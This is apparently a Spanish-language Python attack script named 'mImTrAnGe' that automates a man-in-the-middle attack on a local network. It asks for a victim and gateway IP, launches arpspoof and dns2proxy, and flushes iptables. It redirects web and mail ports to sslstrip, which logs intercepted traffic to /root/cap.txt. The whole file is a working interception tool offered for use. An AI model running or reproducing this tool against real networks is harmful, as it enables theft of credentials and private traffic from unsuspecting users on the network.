import os
import time
import sys
import threading

from subprocess import Popen, PIPE, STDOUT
from netdiscover import *

import pandas as pd
from io import open

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ variables $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


listamenu=["Menu de Opciones:", "1--Selec Interfaz ", "2--Selec Ip-victima ","3--activar parametros de ataque ","4--ataque", "5--Exit" ]#Menu Princcipal

exit=False
key=0
key1=""

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU PRINCIPAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


def menu(listamenu):

	print("\033[1;31;1m ")
	os.system('figlet    mImTrAnGe')
	print("\033[1;37;1m ")
	print("            "+listamenu[0])
	print("\033[1;37;m ")
	print("            "+listamenu[1])
	print("            "+listamenu[2])
	print("            "+listamenu[3])
	print("            "+listamenu[4])
	print("            "+listamenu[5])



#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ menu seleccion interfaz $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


def selec_wlan():
	while True:
		try:
			global wlan
			wlan=input("Introduzca interfaz telnet: ")
			print("interfaz seleccionada "+ wlan)
			
			return wlan
			break

		except TypeError:
			print("error selec interfaz")


#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ funciones ARPpoof DNSserver sslstrip $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


def arpoof1(ip_intrusa, ip_gateway, wlan): 
	
	print("Lanzando ARPpoof 0%")
	process1 = Popen([ 'uxterm', '-e', 'arpspoof', '-i', wlan, '-t', ip_intrusa, ip_gateway ], stdout=PIPE, stderr=PIPE)	
	stdout, stderr = process1.communicate()
		
def arpoof2(ip_intrusa, ip_gateway, wlan):

	print("Lanzando ARPpoof 100%")
	process2 = Popen([ 'uxterm', '-e', 'arpspoof', '-i', wlan, '-t', ip_gateway, ip_intrusa ], stdout=PIPE, stderr=PIPE)	
	stdout, stderr = process2.communicate()	
		
def dnss():

	print("Activacion servidorDNS 100%")
	process3 = Popen(['uxterm', '-e', 'python', 'dns2proxy.py'], stdout=PIPE, stderr=PIPE)	
	stdout, stderr = process3.communicate()


#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$	

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ funciones menu $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$	


def menuconfip():

	global ip_intrusa
	global ip_gateway

	key1=(str(input("visualizar ip de la red Y o N: ")))

	if(key1=='Y'):

		disc = Discover()
		p=disc.scan(ip_range="192.168.1.0/24")
		print("comprobacion estados ip")
		print(p)
		os.system('ip r | grep default')

		print("configuracion de iPs ")
		ip_intrusa=input("introduzca ip victima: ")
		ip_gateway=input("introduzca ip ip_gateway: ")
		print("Datos de configuracion listos ")
		print(str(ip_intrusa))
		print(str(ip_gateway))

	else:

		print("configuracion de iPs ")
		ip_intrusa=input("introduzca ip victima: ")
		ip_gateway=input("introduzca ip ip_gateway: ")
		print("Datos de configuracion listos ")
		print(str(ip_intrusa))
		print(str(ip_gateway))

	return ip_intrusa, ip_gateway


#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ funciones de servicios en ejecucion $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


def iptable():
	
	print("configurando iptables") 

	os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
	os.system('iptables -F')
	os.system('iptables -X')
	os.system('iptables -Z')
	os.system('iptables -t nat -F')	
	os.system('iptables -P FORWARD ACCEPT')
	os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 9000')
	os.system('iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 9000')	
	os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 9000')
	os.system('iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-port 9000')
	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53')
	os.system('iptables-save > /etc/iptables.up.rules')

	print("configuracion iptables terminada")

def ssls():
	
	os.system('python sslstrip2/sslstrip.py -l 9000 -a -w /root/cap.txt')

def ARPpoof(ip_intrusa, ip_gateway, wlan):

	print("ARPpoof")
	
	a = threading.Thread(target=arpoof1, args=(ip_intrusa, ip_gateway, wlan,))
	a.start()

	#b = threading.Thread(target=arpoof2, args=(ip_intrusa, ip_gateway, wlan,))
	#b.start()

def DNSserver():

	print("DNSserver")
	c = threading.Thread(target=dnss, args=())
	c.start()


#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$4 loop program $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

while exit==False:

	menu(listamenu)
	key=(int(input("            "+"Select: ")))

	if (key==1):

		selec_wlan()
		
	elif (key==2):

		menuconfip()			

	elif (key==3):

		iptable()
		ARPpoof(ip_intrusa, ip_gateway, wlan)
		DNSserver()
		
	elif (key==4):

		ssls()

	elif (key==5):		
		
		exit=True
	
print("\033[1;31;1m ")	
print("Smp_A byTe_Dey_bYte_HackiNg")
print("\033[1;31;m ")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$